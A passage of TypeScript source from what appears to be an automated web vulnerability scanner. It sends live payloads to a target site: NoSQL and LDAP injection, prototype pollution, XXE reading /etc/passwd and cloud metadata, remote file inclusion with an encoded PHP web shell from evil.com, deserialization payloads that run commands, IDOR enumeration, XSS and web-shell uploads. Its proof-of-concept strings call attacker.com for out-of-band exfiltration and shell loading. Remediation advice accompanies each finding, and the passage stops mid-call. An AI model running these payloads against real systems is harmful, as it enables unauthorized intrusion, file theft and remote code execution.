        const loginForms = siteStructure.allForms.filter((f: any) => f.method === 'POST' && (f.action.includes('login') || f.action.includes('auth') || f.action.includes('api')));
        for (const form of loginForms.slice(0, 8)) {
          for (const jsonPayload of nosqlJsonPayloads.slice(0, 4)) {
            try {
              const formUrl = form.action.startsWith('http') ? form.action : `${baseUrl}${form.action}`;
              const resp = await fetchWithTimeout(formUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: JSON.parse(jsonPayload), password: JSON.parse(jsonPayload) }),
              }, 6000);
              const respBody = resp.body || '';
              const bodySnippet = respBody.substring(0, 500);
              const detected = nosqlDetectPatterns.some(p => respBody.includes(p));
              if (detected || (resp.status === 200 && respBody.includes('token'))) {
                sendLog(`⚠ NoSQL INJECTION via JSON body: ${formUrl}`, "NOSQL");
                vulnerabilities.push(createProfessionalVuln(
                  "nosql_injection", "critical", formUrl,
                  `NoSQL INJECTION via JSON Body — Authentication Bypass moglich`,
                  "NoSQL Operator Injection uber JSON Body kann komplette Authentication umgehen",
                  "1. Strict JSON Schema Validation\n2. Keine MongoDB-Operatoren in User-Input akzeptieren\n3. sanitize-mongo npm Package verwenden",
                  "https://owasp.org/www-project-web-security-testing-guide/",
                  { payload: jsonPayload, poc: `curl -X POST '${formUrl}' -H 'Content-Type: application/json' -d '{"username":{"$ne":""},"password":{"$ne":""}}'`, evidence: `Server accepted NoSQL operator in JSON body.\nResponse: ${bodySnippet}`, responseSample: bodySnippet }
                ));
                break;
              }
            } catch {}
          }
        }
      }

      // ─────────────────────────────────────────────────────────────────
      // PROTOTYPE POLLUTION TESTING (ENTERPRISE-GRADE)
      // ─────────────────────────────────────────────────────────────────
      sendLog("Prototype-Pollution-Tests (Deep)...", "PROTO");
      const protoDetectPatterns = ["__proto__", "constructor", "prototype", "Prototype", "polluted", "Object.assign", "_.merge", "lodash", "jQuery.extend"];
      // Phase 1: URL parameter-based
      for (const payload of PROTOTYPE_POLLUTION_PAYLOADS.slice(0, 12)) {
        try {
          const testUrl = `${baseUrl}/?${payload}`;
          const resp = await fetchWithTimeout(testUrl, {}, 5000);
          const respBody = resp.body || '';
          const bodySnippet = respBody.substring(0, 500);
          if (resp.status === 500 || protoDetectPatterns.some(p => respBody.includes(p))) {
            const detected = protoDetectPatterns.find(p => respBody.includes(p)) || 'server error';
            sendLog(`⚠ PROTOTYPE POLLUTION: ${testUrl}`, "PROTO");
            vulnerabilities.push(createProfessionalVuln(
              "prototype_pollution", "critical", baseUrl,
              `PROTOTYPE POLLUTION — JavaScript Object Prototype manipulierbar (${detected})`,
              "Prototype Pollution ermoglicht Remote Code Execution, Property Injection, Security Bypass und Denial of Service",
              "1. Object.freeze(Object.prototype)\n2. Map/Set statt plain Objects verwenden\n3. Input-Validierung gegen __proto__/constructor\n4. lodash >= 4.17.12, jQuery >= 3.4.0\n5. Schema-basierte Validierung (Joi/Zod)",
              "https://portswigger.net/web-security/prototype-pollution",
              { payload, poc: `curl -v '${testUrl}'\n\n# Exploitation PoC:\ncurl '${baseUrl}/?__proto__[isAdmin]=true'\ncurl '${baseUrl}/?constructor[prototype][isAdmin]=true'\n\n# JSON body:\ncurl -X POST '${baseUrl}/api' -H 'Content-Type: application/json' -d '{"__proto__":{"isAdmin":true}}'`, evidence: `Proto pollution detected: '${detected}' in response.\nResponse: ${bodySnippet}`, responseSample: bodySnippet }
            ));
            break;
          }
        } catch {}
      }
      // Phase 2: JSON body prototype pollution on API endpoints
      const protoJsonPayloads = [
        '{"__proto__":{"isAdmin":true}}',
        '{"constructor":{"prototype":{"isAdmin":true}}}',
        '{"__proto__":{"toString":"polluted"}}',
        '{"__proto__":{"status":200}}',
      ];
      for (const link of allParamLinks.slice(0, 10)) {
        for (const jsonPayload of protoJsonPayloads) {
          try {
            const linkUrl = new URL(link);
            const apiUrl = linkUrl.origin + linkUrl.pathname;
            const resp = await fetchWithTimeout(apiUrl, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: jsonPayload,
            }, 5000);
            const respBody = resp.body || '';
            if (resp.status === 500 || respBody.includes('isAdmin') || respBody.includes('polluted') || respBody.includes('__proto__')) {
              sendLog(`⚠ PROTOTYPE POLLUTION via JSON: ${apiUrl}`, "PROTO");
              vulnerabilities.push(createProfessionalVuln(
                "prototype_pollution", "critical", apiUrl,
                `PROTOTYPE POLLUTION via JSON Body — Server-side Object Manipulation`,
                "JSON-basierte Prototype Pollution ermoglicht RCE uber Template Engines (Pug, Handlebars, EJS)",
                "1. Object.create(null) fur Data Objects\n2. JSON Schema Validation\n3. Deep-freeze fur Prototypes\n4. WAF-Regel gegen __proto__/constructor",
                "https://portswigger.net/web-security/prototype-pollution/server-side",
                { payload: jsonPayload, poc: `curl -X POST '${apiUrl}' -H 'Content-Type: application/json' -d '${jsonPayload}'`, evidence: `Server processed __proto__ payload without sanitization` }
              ));
              break;
            }
          } catch {}
        }
      }

      // ═══════════════════════════════════════════════════════════════════
      // XXE (XML EXTERNAL ENTITY) TESTING — ENTERPRISE-GRADE
      // ═══════════════════════════════════════════════════════════════════
      sendLog("XXE (XML External Entity) Testing — Enterprise...", "XXE");
      const xxePayloadsLocal = [
        `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
        `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>`,
        `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root>&xxe;</root>`,
        `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>`,
        `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><root>test</root>`,
        `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>`,
        `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>`,
        `<?xml version="1.0"?><!DOCTYPE data [<!ENTITY a "AAAAAAAA"><!ENTITY b "&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;">]><data>&c;</data>`,
      ];
      const xxeDetectPatterns = ["root:", "daemon:", "bin:", "nobody:", "www-data", "mysql:", "[fonts]", "[extensions]", "meta-data", "ami-id", "iam", "AccessDenied", "DOCTYPE", "ENTITY", "XML parsing error"];
      const xxeEndpoints = ['/api', '/upload', '/import', '/xml', '/soap', '/rpc', '/xmlrpc.php', '/rest', '/graphql', '/webhook', '/callback', '/parse'];
      // Phase 1: Test known XML endpoints
      for (const ep of xxeEndpoints) {
        const epUrl = `${baseUrl}${ep}`;
        for (const xxePayload of xxePayloadsLocal.concat(XXE_PAYLOADS.slice(0, 10))) {
          try {
            const resp = await fetchWithTimeout(epUrl, {
              method: 'POST',
              headers: { 'Content-Type': 'application/xml', 'Accept': 'application/xml' },
              body: xxePayload,
            }, 6000);
            const respBody = resp.body || '';
            const bodySnippet = respBody.substring(0, 500);
            const detected = xxeDetectPatterns.some(p => respBody.includes(p));
            if (detected && resp.status !== 404) {
              const matchedPattern = xxeDetectPatterns.find(p => respBody.includes(p)) || '';
              sendLog(`⚠ XXE VULNERABILITY: ${epUrl} [${matchedPattern}]`, "XXE");
              vulnerabilities.push(createProfessionalVuln(
                "xxe", "critical", epUrl,
                `XXE (XML External Entity) — Server parst externe XML-Entities: ${matchedPattern}`,
                "XXE ermoglicht vollstandiges Auslesen des Dateisystems, SSRF zu internen Services, Port-Scanning, und Denial of Service (Billion Laughs)",
                "1. XML External Entity Processing deaktivieren\n2. DTD Processing deaktivieren\n3. libxml_disable_entity_loader(true) in PHP\n4. SAXParserFactory.setFeature('http://apache.org/xml/features/disallow-doctype-decl', true)\n5. JSON statt XML verwenden",
                "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection",
                { payload: xxePayload.substring(0, 200), poc: `curl -X POST '${epUrl}' -H 'Content-Type: application/xml' -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'\n\n# Blind XXE with OOB exfiltration:\ncurl -X POST '${epUrl}' -H 'Content-Type: application/xml' -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]><root>test</root>'\n\n# SSRF via XXE:\ncurl -X POST '${epUrl}' -H 'Content-Type: application/xml' -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>'`, evidence: `XXE pattern '${matchedPattern}' detected in XML response.\nResponse: ${bodySnippet}`, responseSample: bodySnippet }
              ));
              break;
            }
          } catch {}
        }
      }
      // Phase 2: Test uploaded content type XML on discovered forms
      if (siteStructure) {
        for (const form of siteStructure.allForms.filter((f: any) => f.method === 'POST').slice(0, 5)) {
          try {
            const formUrl = form.action.startsWith('http') ? form.action : `${baseUrl}${form.action}`;
            const resp = await fetchWithTimeout(formUrl, {
              method: 'POST',
              headers: { 'Content-Type': 'text/xml' },
              body: xxePayloadsLocal[0],
            }, 5000);
            const respBody = resp.body || '';
            if (xxeDetectPatterns.some(p => respBody.includes(p)) && resp.status !== 404) {
              vulnerabilities.push(createProfessionalVuln(
                "xxe", "critical", formUrl,
                `XXE via Content-Type Manipulation — Form akzeptiert XML-Daten`,
                "Form-Endpoint akzeptiert XML trotz erwarteter Form-Daten, XXE-Angriff moglich",
                "Content-Type Whitelist implementieren, nur erwartete Content-Types akzeptieren",
                "https://portswigger.net/web-security/xxe",
                { poc: `curl -X POST '${formUrl}' -H 'Content-Type: text/xml' -d '${xxePayloadsLocal[0].substring(0, 200)}'`, evidence: `Form endpoint accepted XML content type` }
              ));
            }
          } catch {}
        }
      }

      // ═══════════════════════════════════════════════════════════════════
      // RFI (REMOTE FILE INCLUSION) TESTING — ENTERPRISE-GRADE
      // ═══════════════════════════════════════════════════════════════════
      sendLog("RFI (Remote File Inclusion) Testing — Enterprise...", "RFI");
      const rfiParams = ["file", "page", "path", "include", "inc", "template", "tmpl", "module", "mod", "view", "layout", "theme", "skin", "lang", "language", "load", "require", "url", "src", "source", "content", "doc"];
      const rfiPayloadsLocal = [
        "http://evil.com/shell.txt", "https://evil.com/malicious.php", "//evil.com/rfi.txt",
        "http://evil.com/shell.txt%00", "http://evil.com/shell.txt?",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
        "expect://id", "php://input", "ftp://evil.com/shell.txt",
      ];
      for (const link of allParamLinks.slice(0, 20)) {
        for (const param of rfiParams) {
          if (link.toLowerCase().includes(param + "=")) {
            for (const rfiPayload of rfiPayloadsLocal.concat(RFI_PAYLOADS.slice(0, 10))) {
              try {
                const testUrl = link.replace(new RegExp(`${param}=[^&]*`, 'i'), `${param}=${encodeURIComponent(rfiPayload)}`);
                const resp = await fetchWithTimeout(testUrl, {}, 6000);
                const respBody = resp.body || '';
                const bodySnippet = respBody.substring(0, 500);
                // Detection: server executed/included remote content
                const rfiDetected = respBody.includes("evil.com") || respBody.includes("uid=") || respBody.includes("<?php") ||
                  (resp.status === 200 && respBody.length > 100 && !respBody.includes("<!doctype") && !respBody.includes("not found"));
                if (rfiDetected) {
                  sendLog(`⚠ RFI VULNERABILITY: ${link} via ${param}`, "RFI");
                  vulnerabilities.push(createProfessionalVuln(
                    "rfi", "critical", link,
                    `REMOTE FILE INCLUSION — Server ladt externe Dateien uber '${param}'`,
                    "RFI ermoglicht Remote Code Execution durch Einbinden bosaritger Skripte von externen Servern",
                    "1. allow_url_include = Off in php.ini\n2. Input-Validierung mit Whitelist\n3. Keine dynamischen includes mit User-Input\n4. WAF-Regel gegen http:// in Parametern",
                    "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion",
                    { payload: rfiPayload, poc: `curl -v '${testUrl}'\n\n# RCE via RFI:\ncurl '${link.replace(new RegExp(`${param}=[^&]*`, 'i'), `${param}=http://attacker.com/shell.php`)}'\n\n# Data URI bypass:\ncurl '${link.replace(new RegExp(`${param}=[^&]*`, 'i'), `${param}=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=`)}'`, evidence: `Remote content included via ${param}.\nResponse: ${bodySnippet}`, responseSample: bodySnippet }
                  ));
                  break;
                }
              } catch {}
            }
            break;
          }
        }
      }

      // ═══════════════════════════════════════════════════════════════════
      // INSECURE DESERIALIZATION TESTING — ENTERPRISE-GRADE
      // ═══════════════════════════════════════════════════════════════════
      sendLog("Insecure Deserialization Testing — Enterprise...", "DESER");
      const deserPayloads = [
        // PHP serialized objects
        'O:8:"stdClass":1:{s:4:"test";s:4:"vuln";}',
        'a:1:{s:4:"test";O:8:"stdClass":0:{}}',
        'O:7:"Exploit":1:{s:3:"cmd";s:2:"id";}',
        // Java serialized objects (hex prefix)
        'rO0ABXNy', // java serialized object magic bytes base64
        'aced0005', // java serialized magic hex
        // Python pickle
        "cos\nsystem\n(S'id'\ntR.", 
        'gASVFAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==',
        // Node.js
        '{"rce":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"id\")}()"}',
        '_$$ND_FUNC$$_function(){return require("child_process").execSync("id").toString()}()',
        // YAML deserialization
        '!!python/object/apply:os.system ["id"]',
      ];
      const deserDetectPatterns = ["uid=", "gid=", "root:", "daemon:", "bin:", "stdClass", "Serializable", "unserialize", "ObjectInputStream", "pickle", "marshal", "yaml.load", "SnakeYAML", "__wakeup", "__destruct", "readObject", "java.io"];
      const deserEndpoints = ['/api', '/upload', '/import', '/export', '/data', '/webhook', '/callback', '/transfer', '/sync', '/restore', '/load', '/process'];
      for (const ep of deserEndpoints) {
        for (const payload of deserPayloads.concat(DESERIALIZATION_PAYLOADS.slice(0, 10))) {
          try {
            const epUrl = `${baseUrl}${ep}`;
            // Test with different content types
            for (const ct of ['application/x-www-form-urlencoded', 'application/json', 'application/x-java-serialized-object']) {
              const body = ct.includes('json') ? JSON.stringify({ data: payload }) : `data=${encodeURIComponent(payload)}`;
              const resp = await fetchWithTimeout(epUrl, {
                method: 'POST',
                headers: { 'Content-Type': ct },
                body: body,
              }, 6000);
              const respBody = resp.body || '';
              const bodySnippet = respBody.substring(0, 500);
              const detected = deserDetectPatterns.some(p => respBody.includes(p));
              if (detected && resp.status !== 404) {
                const matchedPattern = deserDetectPatterns.find(p => respBody.includes(p)) || '';
                sendLog(`⚠ INSECURE DESERIALIZATION: ${epUrl} [${matchedPattern}]`, "DESER");
                vulnerabilities.push(createProfessionalVuln(
                  "insecure_deserialization", "critical", epUrl,
                  `INSECURE DESERIALIZATION — ${matchedPattern} detected at ${ep}`,
                  "Insecure Deserialization ermoglicht Remote Code Execution, Authentication Bypass und beliebige Object Manipulation",
                  "1. Keine Deserialisierung von unvertrauenswurdigen Daten\n2. JSON statt native Serialisierung verwenden\n3. Integrity-Checks (HMAC) vor Deserialisierung\n4. Deserialisierung in Sandbox ausfuhren\n5. Type-Whitelisting fur erlaubte Klassen",
                  "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_HTTP_Incoming_Requests",
                  { payload: payload.substring(0, 200), poc: `# PHP Deserialization:\ncurl -X POST '${epUrl}' -d 'data=O:8:"stdClass":1:{s:4:"cmd";s:2:"id";}'\n\n# Java Deserialization (ysoserial):\njava -jar ysoserial.jar CommonsCollections1 'id' | base64 | curl -X POST '${epUrl}' -H 'Content-Type: application/x-java-serialized-object' --data-binary @-\n\n# Python Pickle:\npython -c "import pickle,os;pickle.dumps(os.system('id'))" | curl -X POST '${epUrl}' --data-binary @-`, evidence: `Deserialization pattern '${matchedPattern}' detected.\nResponse: ${bodySnippet}`, responseSample: bodySnippet }
                ));
                break;
              }
            }
          } catch {}
        }
      }

      // ═══════════════════════════════════════════════════════════════════
      // IDOR (INSECURE DIRECT OBJECT REFERENCE) TESTING — ENTERPRISE-GRADE
      // ═══════════════════════════════════════════════════════════════════
      sendLog("IDOR Testing — Enterprise...", "IDOR");
      const idorParamNames = ["id", "user_id", "uid", "account_id", "account", "order_id", "order", "doc_id", "file_id", "profile_id", "customer_id", "invoice_id", "report_id", "transaction_id", "record_id", "item_id", "msg_id", "ticket_id", "case_id"];
      for (const link of allParamLinks.slice(0, 25)) {
        for (const idorParam of idorParamNames) {
          const paramRegex = new RegExp(`${idorParam}=(\\d+)`, 'i');
          const match = link.match(paramRegex);
          if (match) {
            const origId = match[1];
            const testIds = ["1", "0", "-1", String(parseInt(origId) + 1), String(parseInt(origId) - 1), "999999", "admin"];
            let origResp: any = null;
            try {
              origResp = await fetchWithTimeout(link, {}, 5000);
            } catch {}

            for (const testId of testIds) {
              if (testId === origId) continue;
              try {
                const testUrl = link.replace(paramRegex, `${idorParam}=${testId}`);
                const resp = await fetchWithTimeout(testUrl, {}, 5000);
                const respBody = resp.body || '';
                const bodySnippet = respBody.substring(0, 500);
                // IDOR: getting 200 with different content for a different ID
                if (resp.status === 200 && respBody.length > 50 && !respBody.includes("not found") && !respBody.includes("404") && !respBody.includes("unauthorized")) {
                  // Compare with original to ensure different data
                  if (origResp && origResp.body && origResp.body !== respBody && respBody.length > 50) {
                    sendLog(`⚠ IDOR DETECTED: ${idorParam}=${origId} → ${testId}`, "IDOR");
                    vulnerabilities.push(createProfessionalVuln(
                      "idor", "critical", link,
                      `IDOR — Zugriff auf fremde Daten uber Parameter '${idorParam}' (${origId} → ${testId})`,
                      "Insecure Direct Object Reference ermoglicht Zugriff auf fremde Bankkonten, Transaktionen, und personliche Daten anderer Benutzer",
                      "1. Authorization-Check auf Server-Seite fur JEDEN Request\n2. Indirekte Referenzen (UUID statt sequentielle IDs)\n3. Access Control Matrix implementieren\n4. Object-Level Authorization (OWASP #1)",
                      "https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/",
                      { payload: `${idorParam}=${testId}`, poc: `# Original Request:\ncurl -v '${link}'\n\n# IDOR — Access other user's data:\ncurl -v '${link.replace(paramRegex, `${idorParam}=${testId}`)}'\n\n# Automated IDOR enumeration:\nfor i in $(seq 1 100); do curl -s '${link.replace(paramRegex, `${idorParam}=$i`)}' | head -1; done`, evidence: `Different data returned for ${idorParam}=${testId} vs original ${idorParam}=${origId}.\nOriginal size: ${origResp?.body?.length || 0} bytes, Test size: ${respBody.length} bytes.\nResponse: ${bodySnippet}`, responseSample: bodySnippet }
                    ));
                    break;
                  }
                }
              } catch {}
            }
            break;
          }
        }
      }
      // Also test API path-based IDOR
      const apiPathPatterns = ['/api/users/', '/api/accounts/', '/api/orders/', '/api/invoices/', '/api/customers/', '/api/transactions/', '/api/profiles/', '/api/documents/', '/api/files/', '/api/reports/'];
      for (const apiPath of apiPathPatterns) {
        try {
          const testUrl1 = `${baseUrl}${apiPath}1`;
          const testUrl2 = `${baseUrl}${apiPath}2`;
          const resp1 = await fetchWithTimeout(testUrl1, {}, 5000);
          if (resp1.status === 200 && resp1.body && resp1.body.length > 50 && !resp1.body.includes("not found")) {
            const resp2 = await fetchWithTimeout(testUrl2, {}, 5000);
            if (resp2.status === 200 && resp2.body && resp2.body.length > 50 && resp1.body !== resp2.body) {
              sendLog(`⚠ API PATH IDOR: ${apiPath}`, "IDOR");
              vulnerabilities.push(createProfessionalVuln(
                "idor", "critical", `${baseUrl}${apiPath}`,
                `API PATH IDOR — Sequentielle Ressourcen ohne Authorization ${apiPath}`,
                "API ermoglicht Enumeration aller Ressourcen ohne Berechtigungsprufung",
                "1. Object-Level Authorization implementieren\n2. UUIDs statt sequentielle IDs\n3. Rate Limiting\n4. API Gateway mit Auth-Check",
                "https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/",
                { poc: `curl -v '${testUrl1}'\ncurl -v '${testUrl2}'\n\n# Enumerate all:\nfor i in $(seq 1 1000); do curl -s '${baseUrl}${apiPath}$i'; done`, evidence: `Both ${apiPath}1 and ${apiPath}2 returned different data without authentication` }
              ));
            }
          }
        } catch {}
      }

      // ═══════════════════════════════════════════════════════════════════
      // DOM-BASED XSS TESTING — ENTERPRISE-GRADE
      // ═══════════════════════════════════════════════════════════════════
      sendLog("DOM-Based XSS Testing — Enterprise...", "DOMXSS");
      const domXssSinks = [
        "document.write", "document.writeln", "innerHTML", "outerHTML",
        "insertAdjacentHTML", "eval(", "setTimeout(", "setInterval(",
        "Function(", "execScript(", "location.href", "location.assign",
        "location.replace", "window.open", "$.html(", "$.append(",
        ".html(", "v-html", "dangerouslySetInnerHTML", "[innerHTML]",
        "ng-bind-html", "bypassSecurityTrustHtml"
      ];
      const domXssSources = [
        "location.hash", "location.search", "location.href", "document.URL",
        "document.documentURI", "document.referrer", "window.name",
        "postMessage", "localStorage", "sessionStorage", "document.cookie"
      ];
      // Analyze crawled pages for DOM XSS sinks
      if (siteStructure) {
        try {
          const mainResp = await fetchWithTimeout(url, {}, 8000);
          const mainBody = mainResp.body || '';
          const foundSinks: string[] = [];
          const foundSources: string[] = [];
          for (const sink of domXssSinks) {
            if (mainBody.includes(sink)) foundSinks.push(sink);
          }
          for (const source of domXssSources) {
            if (mainBody.includes(source)) foundSources.push(source);
          }
          if (foundSinks.length > 0 && foundSources.length > 0) {
            sendLog(`⚠ DOM XSS: ${foundSinks.length} sinks + ${foundSources.length} sources found`, "DOMXSS");
            vulnerabilities.push(createProfessionalVuln(
              "dom_xss", "high", url,
              `DOM-BASED XSS — ${foundSinks.length} dangerous sinks mit ${foundSources.length} controllable sources`,
              "DOM-basierte XSS ermoglicht Client-Side Code Execution ohne Server-Interaktion, schwer durch WAF/IDS zu erkennen",
              "1. Keine User-kontrollierte Daten in DOM Sinks\n2. DOMPurify fur HTML-Sanitization\n3. textContent statt innerHTML\n4. CSP mit strict-dynamic\n5. Trusted Types API aktivieren",
              "https://portswigger.net/web-security/cross-site-scripting/dom-based",
              { poc: `# DOM XSS PoC:\n${url}#<img src=x onerror=alert(document.cookie)>\n${url}?q=<script>alert(1)</script>\n\n# Dangerous Source→Sink flows found:\nSources: ${foundSources.join(', ')}\nSinks: ${foundSinks.join(', ')}\n\n# Exploitation:\n${url}#javascript:alert(document.domain)`, evidence: `DOM XSS Sources: ${foundSources.join(', ')}\nDOM XSS Sinks: ${foundSinks.join(', ')}\n\nDangerous combinations detected in page JavaScript.` }
            ));
          }
          // Check for inline event handlers with user data
          const inlineEventPatterns = /on(click|load|error|mouseover|focus|blur|submit|input|change)=["'][^"']*\b(location|document|window|hash|search|param)/gi;
          const inlineMatches = mainBody.match(inlineEventPatterns);
          if (inlineMatches && inlineMatches.length > 0) {
            vulnerabilities.push(createProfessionalVuln(
              "dom_xss", "high", url,
              `DOM XSS via Inline Event Handlers — ${inlineMatches.length} gefunden`,
              "Inline Event Handler mit User-kontrollierbaren Daten ermoglicht XSS",
              "Event Handler in JavaScript auslagern, CSP script-src ohne 'unsafe-inline'",
              "https://portswigger.net/web-security/cross-site-scripting/dom-based",
              { evidence: `Inline event handlers with user data: ${inlineMatches.slice(0, 5).join(', ')}` }
            ));
          }
        } catch {}
      }
      // Also test hash-based payloads
      const domXssHashPayloads = ["#<img src=x onerror=alert(1)>", "#javascript:alert(1)", "#'-alert(1)-'", "#\"><script>alert(1)</script>"];
      for (const hashPayload of domXssHashPayloads) {
        try {
          const testUrl = `${url}${hashPayload}`;
          const resp = await fetchWithTimeout(testUrl, {}, 5000);
          const respBody = resp.body || '';
          if (respBody.includes("alert(1)") || respBody.includes("onerror=alert")) {
            sendLog(`⚠ DOM XSS via hash fragment!`, "DOMXSS");
            vulnerabilities.push(createProfessionalVuln(
              "dom_xss", "critical", url,
              `DOM XSS — Hash Fragment wird unsicher in DOM eingesetzt`,
              "URL Fragment (#) wird direkt in DOM geschrieben — ermoglicht Phishing und Session Hijacking",
              "DOMPurify verwenden, location.hash nie direkt in innerHTML/document.write",
              "https://portswigger.net/web-security/cross-site-scripting/dom-based",
              { payload: hashPayload, poc: `# Open this URL in browser:\n${testUrl}`, evidence: `Hash fragment payload reflected in DOM output` }
            ));
            break;
          }
        } catch {}
      }

      // ═══════════════════════════════════════════════════════════════════
      // FILE UPLOAD VULNERABILITY TESTING — ENTERPRISE-GRADE
      // ═══════════════════════════════════════════════════════════════════
      sendLog("File Upload Vulnerability Testing — Enterprise...", "UPLOAD");
      const uploadEndpoints = ['/upload', '/api/upload', '/file/upload', '/media/upload', '/image/upload', '/avatar/upload', '/attachment', '/api/files', '/api/media', '/admin/upload', '/api/import', '/api/v1/upload'];
      const uploadDetectPatterns = ["uploaded", "success", "file_url", "filename", "path", "location", "url", "stored"];
      for (const ep of uploadEndpoints) {
        try {
          const epUrl = `${baseUrl}${ep}`;
          // Test 1: Check if endpoint exists
          const checkResp = await fetchWithTimeout(epUrl, { method: 'OPTIONS' }, 5000);
          if (checkResp.status === 404) continue;

          // Test 2: Try uploading with dangerous extension
          const boundary = '----WebKitFormBoundary' + Math.random().toString(36).substr(2);
          const dangerousUploads = [
            { filename: 'test.php', content: '<?php echo "VULNERABLE"; ?>', mime: 'application/x-php' },
            { filename: 'test.php.jpg', content: '<?php echo "VULNERABLE"; ?>', mime: 'image/jpeg' },
            { filename: 'test.jsp', content: '<% out.println("VULNERABLE"); %>', mime: 'text/plain' },
            { filename: 'test.aspx', content: '<%@ Page Language="C#" %>', mime: 'text/plain' },
            { filename: 'test.svg', content: '<svg onload="alert(1)">', mime: 'image/svg+xml' },
            { filename: 'test.html', content: '<script>alert(1)</script>', mime: 'text/html' },
            { filename: '..\\..\\test.php', content: '<?php phpinfo(); ?>', mime: 'application/x-php' },
          ];
          for (const upload of dangerousUploads) {
            try {
              const body = `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${upload.filename}"\r\nContent-Type: ${upload.mime}\r\n\r\n${upload.content}\r\n--${boundary}--`;
              const resp = await fetchWithTimeout(epUrl, {
                method: 'POST',
                headers: { 'Content-Type': `multipart/form-data; boundary=${boundary}` },
                body: body,
              }, 8000);
              const respBody = resp.body || '';
              const bodySnippet = respBody.substring(0, 500);
              if (resp.status >= 200 && resp.status < 300 && uploadDetectPatterns.some(p => respBody.toLowerCase().includes(p))) {
                sendLog(`⚠ FILE UPLOAD VULN: ${epUrl} accepts ${upload.filename}`, "UPLOAD");
                vulnerabilities.push(createProfessionalVuln(
                  "file_upload", "critical", epUrl,
                  `FILE UPLOAD VULNERABILITY — Server akzeptiert gefahrliche Datei: ${upload.filename}`,
                  "Unrestricted File Upload ermoglicht Remote Code Execution durch Hochladen von Web Shells (PHP/JSP/ASPX), XSS uber SVG/HTML, und Path Traversal",
                  "1. Datei-Extension Whitelist (nur .jpg, .png, .pdf)\n2. Content-Type Validierung\n3. Magic Bytes Prufung\n4. Dateien auserhalb des Web-Roots speichern\n5. Zufalliger Dateiname nach Upload\n6. Anti-Virus Scan vor Speicherung",
                  "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
                  { payload: `${upload.filename} (${upload.mime})`, poc: `# Upload Web Shell:\ncurl -X POST '${epUrl}' -F 'file=@shell.php;type=image/jpeg;filename=shell.php.jpg'\n\n# SVG XSS:\ncurl -X POST '${epUrl}' -F 'file=@xss.svg'\n\n# Path Traversal Upload:\ncurl -X POST '${epUrl}' -F 'file=@shell.php;filename=../../shell.php'`, evidence: `Server accepted upload of ${upload.filename}.\nResponse: ${bodySnippet}`, responseSample: bodySnippet }
                ));
                break;
              }
            } catch {}
          }
        } catch {}
      }

      // ═══════════════════════════════════════════════════════════════════
      // LDAP INJECTION TESTING — ENTERPRISE-GRADE
      // ═══════════════════════════════════════════════════════════════════
      sendLog("LDAP Injection Testing — Enterprise...", "LDAP");
      const ldapPayloadsLocal = [
        "*", "*()|%26'", "*()|&'", "admin*", "*)(uid=*))(|(uid=*",
        "*)(%26", "*(objectClass=*)", "*)(|(objectclass=*))",
        "admin)(&)", "admin)(|(password=*))", "*))%00",
      ];
      const ldapDetectPatterns = ["LDAP", "ldap", "Active Directory", "Distinguished Name", "objectClass", "cn=", "dc=", "ou=", "uid=", "sAMAccountName", "javax.naming", "LdapException", "InvalidNameException"];
      const ldapParams = ["username", "user", "login", "name", "cn", "uid", "dn", "search", "q", "filter", "query"];
      for (const link of allParamLinks.slice(0, 15)) {
        for (const param of ldapParams) {
          if (link.toLowerCase().includes(param + "=")) {
            for (const payload of ldapPayloadsLocal.concat(LDAP_PAYLOADS.slice(0, 8))) {
              try {
                const testUrl = link.replace(new RegExp(`${param}=[^&]*`, 'i'), `${param}=${encodeURIComponent(payload)}`);
                const resp = await fetchWithTimeout(testUrl, {}, 6000);
                const respBody = resp.body || '';
                const bodySnippet = respBody.substring(0, 500);
                if (ldapDetectPatterns.some(p => respBody.includes(p))) {
                  const matchedPattern = ldapDetectPatterns.find(p => respBody.includes(p)) || '';
                  sendLog(`⚠ LDAP INJECTION: ${link} [${matchedPattern}]`, "LDAP");
                  vulnerabilities.push(createProfessionalVuln(
                    "ldap_injection", "critical", link,
                    `LDAP INJECTION — ${matchedPattern} in Response uber '${param}'`,
                    "LDAP Injection ermoglicht Authentication Bypass, Daten-Exfiltration aus Active Directory, und Enumeration aller Benutzer/Gruppen",
